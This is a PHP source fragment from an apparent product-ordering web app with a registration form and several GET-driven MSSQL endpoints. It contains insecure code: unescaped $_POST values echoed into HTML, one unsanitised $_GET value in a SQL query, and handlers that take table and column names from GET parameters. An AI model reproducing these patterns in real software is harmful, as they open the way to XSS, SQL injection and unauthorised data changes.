</td><td><span><input id=reg_value1 name=reg_value1 type=text value="'.$_POST["reg_value1"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" ></span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("ic",$_SESSION["language"]).': </span>
</td><td style=vertical-align:top; ><input id=reg_value2 name=reg_value2 type=text value="'.$_POST["reg_value2"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:140px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_140_22.png\') no repeat top left;" ><span style=vertical-align:top;cursor:pointer;margin-left:5px;width:74px;height:22px;margin-top:1px;padding-top:4px;font-weight:bold;font-size:12px;font-family:verdana;text-align:center;color:white;background:url(\'./images/ares.png\') no repeat top left; onmouseout="this.style.color=\'white\'" onmouseover="this.style.color=\'#F2DE41\'" onclick="parent.mfcr(document.getElementById(\'reg_value2\').value);" >ARES</span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("customer_company",$_SESSION["language"]).': </span>
</td><td><span><input id=reg_value3 name=reg_value3 type=text value="'.$_POST["reg_value3"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("street",$_SESSION["language"]).': </span>
</td><td><span><input id=reg_value4 name=reg_value4 type=text value="'.$_POST["reg_value4"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" ></span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("city",$_SESSION["language"]).': </span>
</td><td><span><input id=reg_value5 name=reg_value5 type=text value="'.$_POST["reg_value5"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" ></span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("post_code",$_SESSION["language"]).': </span>
</td><td><span><input id=reg_value6 name=reg_value6 type=text value="'.$_POST["reg_value6"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" ></span>
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("country",$_SESSION["language"]).': </span>
</td><td><span>
<select id=reg_value10 name=reg_value10 style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/yellow_219_22.png\') no repeat top left;" > 
';
        @$sql = "SELECT country FROM [dbo].[120_country] ORDER BY country";
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
            $get_data.='<option value="'.@$row[0].'" ';
            if ($_POST["reg_value10"]==@$row[0] ) {$get_data.=' selected=selected ';} 
//                if (country_info(getIpAddress(),"CountryName","json") == @$row[0] ) {
//                   $get_data.=' selected=selected ';    
//                }
            $get_data.=' > '.@$row[0].'</option>';    
        }
        
$get_data.='</select>
</span>
</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("dic",$_SESSION["language"]).': </span>
</td><td><span><input id=reg_value7 name=reg_value7 type=text value="'.$_POST["reg_value7"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("phone",$_SESSION["language"]).': </span>
</td><td><span><input id=reg_value8 name=reg_value8 type=text value="'.$_POST["reg_value8"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("email",$_SESSION["language"]).': </span>
</td><td ><span id=email_check status=BAD style="width:32px;vertical-align:middle;"></span><span><input onkeyup="parent.check_email(\'exist\');" id=reg_value9 name=reg_value9 type=text value="'.$_POST["reg_value9"].'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:187px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_email.png\') no repeat top left;" ></span>
</td></tr>



<tr><td colspan=2 style="width:120px;" >
<span onclick=parent.new_registration_request(); style="cursor:pointer;color:white;font-weight:bold;font-size:12px;font-family: verdana;text-align:center;width:187px;height:22px;background: url(./images/registration_confirm.png);padding-top:3px;"  onmouseout="this.style.color=\'white\'" onmouseover="this.style.color=\'#F2DE41\'" >'.dictionary("confirm_registration",$_SESSION["language"]).'</span>
</td></tr>

<input type=hidden name=check value="NEW_REG" >
</form></table>
</div>

<div onclick=hidden_window_status(this.id); id=window_status style="display:none;cursor:pointer;position: absolute; left: 125px; top: 480px; width:450px;height:60px;border:0px;text-align:center;padding:10;14;10;10px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/atypical.png) top left no-repeat;" >
<strong>'.dictionary("bad_request",$_SESSION["language"]).'</strong></div>


';    
echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script>
<style>
.strength{width:0px;background:gray;}
.strength0{width:28px;background:gray;}
.strength1{width:56px;background:#ff0000;}
.strength2{width:84px;background:#ff5f5f;}
.strength3{width:112px;background:#56e500;}
.strength4{width:140px;background:#4dcd00;}
.strength5{width:169px;background:#399800;}
</style>

<script>
function passwordStrength(password,passwordStrength)
{
 var desc = new Array();
 desc[0] = "'.dictionary("very_weak",$_SESSION["language"]).'";
 desc[1] = "'.dictionary("weak",$_SESSION["language"]).'";
 desc[2] = "'.dictionary("good",$_SESSION["language"]).'";
 desc[3] = "'.dictionary("medium",$_SESSION["language"]).'";
 desc[4] = "'.dictionary("strong",$_SESSION["language"]).'";
 desc[5] = "'.dictionary("strongest",$_SESSION["language"]).'";
 var score   = 0;
 if (password.length > 6) score++;
 if ( ( password.match(/[a-z]/) ) && ( password.match(/[A-Z]/) ) ) score++;
 if (password.match(/\d+/)) score++;
 if ( password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/) ) score++;
 if (password.length > 12) score++;
if (password.length > 0){  
    passwordStrength.title = desc[score];
    passwordStrength.className = "strength" + score;
} else {
    passwordStrength.title = "";
    passwordStrength.className = "strength";
    }
}

</script>
</head><body style="width:100%;height:100%;padding:0px;margin:8px;margin-bottom:0px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;">'.$get_data.'</body></html>
<script>function delayed_hidden_window_status(value){setTimeout(function(){document.getElementById(value).style.display="none";}, 5000);}function hidden_window_status(value){document.getElementById(value).style.display="none";}</script>
<script src="./functions/js/data_list.js" type="text/javascript"></script>
';
 
 
}






if (isset($_GET["std_product"])){//request for final (all values)
    $_SESSION['product_selecting']="";$cykl=0;
    require_once ("./config/mssql_dbconnect.php");
    $cenik_sql = "SELECT systemname FROM dbo.[100_pricelist] WHERE data_type='".mssecuresql($_SESSION["language"])."' ";
            @$check = sqlsrv_query( $conn, $cenik_sql , $params, $options );
            $row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
            @$cenik = $row[0];
        $sql="SELECT systemname FROM dbo.[100_main_setting] WHERE data_type='karat_params' ";
            @$check = sqlsrv_query( $conn, $sql , $params, $options );
            @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
        $temp=explode (",",$row[0]);
    $choosed_db_fields=" nomenklatura.cislo_nomenklatury
  ,nomenklatura.nazev
  ,'user_kat_znaceni_2' = nomenklatura.user_kat_oznaceni + ' - ' + CASE WHEN substring(RIGHT(nomenklatura.cislo_nomenklatury,5),1,1) = '0' THEN RIGHT(nomenklatura.cislo_nomenklatury,4) ELSE RIGHT(nomenklatura.cislo_nomenklatury,5) END
  ,( CONVERT(varchar(50),CONVERT(float,nomenklatura.brutto)) + ' Kg') AS brutto
  ,nomenklatura.id_mj
  ,'".mssecuresql($_GET['height'])."x".mssecuresql($_GET['width'])."x".mssecuresql($_GET['depth'])."' AS size
  ,CASE 
  WHEN substring(RIGHT(nomenklatura.cislo_nomenklatury,6),1,2) = '00' THEN RIGHT(nomenklatura.cislo_nomenklatury,4)
  WHEN substring(RIGHT(nomenklatura.cislo_nomenklatury,6),1,1) = '0' THEN RIGHT(nomenklatura.cislo_nomenklatury,5) 
  WHEN substring(RIGHT(nomenklatura.cislo_nomenklatury,5),1,1) = '0' THEN RIGHT(nomenklatura.cislo_nomenklatury,4) 
  ELSE RIGHT(nomenklatura.cislo_nomenklatury,5) 
  END AS order_number,
  
  (SELECT CONVERT(VARCHAR, CONVERT(float,polozky.cena)) + ' ' + polozky.ref_id_meny 
from dba.cn_cenik cenik,
dba.cn_cenik_polozky polozky
where platnost = 1
AND cenik.cenik = polozky.cenik
AND cenik.cenik = '".mssecuresql($cenik)."'
AND polozky.id_nomen = nomenklatura.id_nomen
AND cenik.poradi =  (SELECT  TOP 1 poradi FROM dba.cn_cenik WHERE cenik='".mssecuresql($cenik)."' ORDER BY poradi DESC)
AND polozky.poradi = (SELECT  TOP 1 poradi FROM dba.cn_cenik_polozky WHERE cenik='".mssecuresql($cenik)."' ORDER BY poradi DESC)
) as cena,convert(numeric,nomenklatura.dph) as dph

";
    @$sql =  "SELECT TOP 1 $choosed_db_fields FROM dba.[nomenklatura] nomenklatura WHERE nomenklatura.nazev LIKE '% ".mssecuresql($_GET["std_product"])."%' AND nomenklatura.skupina_nomenklatur LIKE '".mssecuresql($_SESSION['Selected_Product'])."' AND ((nomenklatura.user_std_rozmer LIKE ' ".mssecuresql($_GET['height'])."x%' OR nomenklatura.user_std_rozmer LIKE '".mssecuresql($_GET['height'])."x%' OR nomenklatura.user_std_rozmer LIKE '0".mssecuresql($_GET['height'])."x%') AND (nomenklatura.user_std_rozmer LIKE '%x ".$_GET['width']."x%' OR nomenklatura.user_std_rozmer LIKE '%x".mssecuresql($_GET['width'])."x%' OR nomenklatura.user_std_rozmer LIKE '%x0".mssecuresql($_GET['width'])."x%') AND (nomenklatura.user_std_rozmer LIKE '%x ".mssecuresql($_GET['depth'])."' OR nomenklatura.user_std_rozmer LIKE '%x".mssecuresql($_GET['depth'])."' OR nomenklatura.user_std_rozmer LIKE '%x0".mssecuresql($_GET['depth'])."')) AND nomenklatura.platnost = '1' AND nomenklatura.typ = '7' ";
    //program_log($sql,'delete','sql.log');
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
            while (@$temp[$cykl]):
                echo "if(window.frames[0].document.getElementById('".$temp[$cykl]."')){window.frames[0].document.getElementById('".$temp[$cykl]."').innerHTML = '".$row[$cykl]."';}";
                $_SESSION['product_selecting'].=$row[$cykl].":+:";
            $cykl++;endwhile;
      $_SESSION['product_selecting'].=$_SESSION["last_datalist"].":+:".$_SESSION["language"].":+:".$cenik.":+:".$_GET["std_product"].":+:".$_SESSION['Selected_Product'].":+:".$_GET['height'].":+:".$_GET['width'].":+:".$_GET['depth'];
      //new fields must be added to the end of variable when is not parameter
      $_SESSION['product_selecting'].=":+:".$row[8];
           echo "
                    var frame1_target = document.getElementById('program_body');
            try{if (frame1_target.contentWindow.document.getElementById('confirm_amount')){
                frame1_target.contentWindow.document.getElementById('confirm_amount').disabled=false;
                frame1_target.contentWindow.document.getElementById('confirm_button').disabled=false;
             }
            }
            catch ( e ){
                //
            } 

        ";

        }
        if ( $cykl == 0 ) {
             while (@$temp[$cykl]):
                echo "if(window.frames[0].document.getElementById('".$temp[$cykl]."')){window.frames[0].document.getElementById('".$temp[$cykl]."').innerHTML = '".$row[$cykl]."';}";
                $_SESSION['product_selecting'].=$row[$cykl].":+:";
            $cykl++;endwhile; 
        echo "
                    var frame1_target = document.getElementById('program_body');
            try{if (frame1_target.contentWindow.document.getElementById('confirm_amount')){
                frame1_target.contentWindow.document.getElementById('confirm_amount').disabled=true;
                frame1_target.contentWindow.document.getElementById('confirm_button').disabled=true;
             }
            }
            catch ( e ){
                //
            } 
        ";
        }
        sqlsrv_close($conn);
      echo "document.getElementById('loading').style.display='none';";
}






if (isset($_GET["del_image"]) && @$_SESSION[$sess_id.'logged_user']){
    require_once ("./config/mssql_dbconnect.php");
    $fn_sql = "UPDATE dbo.[".mssecuresql($_GET[del_image])."] SET icon=NULL, mime_type='' where id='".mssecuresql(@$_GET["id"])."' ";
    $fn_sql_ins_res = sqlsrv_query( $conn, $fn_sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
    sqlsrv_close($conn);
}




if (isset($_GET["update_rec"]) && @$_SESSION[$sess_id.'logged_user']){
    require_once ("./config/mssql_dbconnect.php");
    if (isset($_GET["v1"])&& isset($_GET["v2"]) && isset($_GET["v3"]) && isset($_GET["v4"])){
    $fn_sql = "UPDATE dbo.[".mssecuresql($_GET["v4"])."] SET ".mssecuresql($_GET["v3"])."='".mssecuresql($_GET["v2"])."' where id='".mssecuresql(@$_GET["v1"])."' ";
    $fn_sql_ins_res = sqlsrv_query( $conn, $fn_sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
    sqlsrv_close($conn);
    }    
}



if (isset($_GET["check_username"])){//check if username exist
    require_once ("./config/mssql_dbconnect.php");
    echo "var frame1_target = document.getElementById('program_body');";
    $check_user_sql = "SELECT id FROM dbo.[120_registration] WHERE login_name='".mssecuresql($_GET["check_username"])."' ";
            @$check = sqlsrv_query( $conn, $check_user_sql , $params, $options );
            if (sqlsrv_num_rows($check)) {
                echo "frame1_target.contentWindow.document.getElementById('user_check').innerHTML='<img src=\"./images/denied.png\" width=20px height=20px>';";
            }
            else {
                echo "frame1_target.contentWindow.document.getElementById('user_check').innerHTML='<img src=\"./images/success.png\" width=20px height=20px>';";
            }
}



if (isset($_GET["check_email"])){// mail / type - check if email address exist
    require_once ("./config/mssql_dbconnect.php");
    echo "var frame1_target = document.getElementById('program_body');";
    $check_user_sql = "SELECT full_name FROM dbo.[120_registration] WHERE email='".mssecuresql($_GET["check_email"])."' ";
            @$check = sqlsrv_query( $conn, $check_user_sql , $params, $options );
            if ($_GET["type"]=="validity"){
                if (check_email_exp($_GET["check_email"])) {
                    echo "frame1_target.contentWindow.document.getElementById('email_check').innerHTML='<img src=\"./images/success.png\" width=20px height=20px >';
                    frame1_target.contentWindow.document.getElementById('email_check').status='OK';
                    ";
                }
                else {
                    echo "frame1_target.contentWindow.document.getElementById('email_check').innerHTML='<img src=\"./images/denied.png\" width=20px height=20px >';
                    frame1_target.contentWindow.document.getElementById('email_check').status='BAD';
                    ";
                }
            }
            if ($_GET["type"]=="exist"){
                if (sqlsrv_num_rows($check)==0 && check_email_exp($_GET["check_email"])) {
                    echo "frame1_target.contentWindow.document.getElementById('email_check').innerHTML='<img src=\"./images/success.png\" width=20px height=20px >';
                    frame1_target.contentWindow.document.getElementById('email_check').status='OK';
                    ";
                }
                else {
                    echo "frame1_target.contentWindow.document.getElementById('email_check').innerHTML='<img src=\"./images/denied.png\" width=20px height=20px >';
                    frame1_target.contentWindow.document.getElementById('email_check').status='BAD';
                    ";
                }
            }
            if ($_GET["type"]=="existed"){
                if (sqlsrv_num_rows($check)>0 && check_email_exp($_GET["check_email"])) {
                    echo "frame1_target.contentWindow.document.getElementById('email_check').innerHTML='<img src=\"./images/success.png\" width=20px height=20px >';
                    frame1_target.contentWindow.document.getElementById('email_check').status='OK';
                    ";
                }
                else {
                    echo "frame1_target.contentWindow.document.getElementById('email_check').innerHTML='<img src=\"./images/denied.png\" width=20px height=20px >';
                    frame1_target.contentWindow.document.getElementById('email_check').status='BAD';
                    ";
                }
            }
            
}



if (isset($_GET["check_logon_status"])){
    $data="";
    require_once ("./config/mssql_dbconnect.php");
    @$sql =  " SELECT * FROM dbo.[100_icon_panel] order by sequence";
    @$check = sqlsrv_query( $conn, $sql , $params, $options );$cycle=0;

    while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
        if (@$row["data_type"]=="login"){
            if (@$_SESSION[$sess_id.'logged_user']){
            $data.="
            parent.document.getElementById('main_panel_menu_".$cycle."').src ='./images/user_logout.png';
            parent.document.getElementById('main_panel_menu_".$cycle."').title ='".dictionary("logout_title",$_SESSION["language"])."';
            ";
            }
            else{$data.="parent.document.getElementById('main_panel_menu_".$cycle."').src ='./images/user_logon.png';
            parent.document.getElementById('main_panel_menu_".$cycle."').title ='".dictionary("client_logon",$_SESSION["language"])."';
            ";
            }    
        }
    $cycle++;
    }
    echo $data;
}



if (isset($_GET["prepare_customer_data"])){
    if ($_GET["prepare_customer_data"]<>"off"){@$_SESSION["customer_info"][$_GET["sequence"]] = $_GET["prepare_customer_data"];}
    else {@$_SESSION["customer_info"][$_GET["sequence"]] ="";}
}




?>


